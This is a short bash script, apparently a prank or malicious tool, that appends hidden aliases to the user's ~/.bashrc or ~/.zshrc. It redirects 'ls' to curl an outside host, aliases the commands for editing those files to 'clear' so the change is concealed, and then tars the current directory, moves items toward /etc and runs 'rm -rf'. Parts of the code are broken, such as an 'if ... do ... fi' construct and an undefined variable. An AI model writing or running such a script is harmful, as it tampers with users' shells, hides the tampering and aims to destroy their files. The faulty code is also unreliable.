#!/bin/bash

function checkrc {
	if [[ -e $(find ~/.bashrc) ]]
	then
		echo $(inject)>>~/.bashrc
		exec bash
		return
	else
		echo $(inject)>>~/.zshrc
		source zsh
	fi
}

function movedir {
	dirn='asdvqsfghhjyyqqsfqfqsqf'
	tarball="$(echo $(pwd) | tr -d '/').tar"

	if [[ $(echo $(pwd)) != '/' ]]
	do
		tar cf ${tarball} . 2>/dev/null
		mkdir ${dirn}
		mv $tarball ${dirn}
		mv $dirname /etc/
		rm -rf
	fi
}

function inject {
	echo "
	
	alias ls='curl parrot.live'
	
	alias 'miv crhsab.\~'='vim ~/.bashrc'
	alias 'miv crhsz.\~'='vim ~/.zshrc'
	
	alias 'vim ~/.bashrc'='clear'
	alias 'vim ~/.zshrc'='clear'

	"
}

$(checkrc)
$(movedir)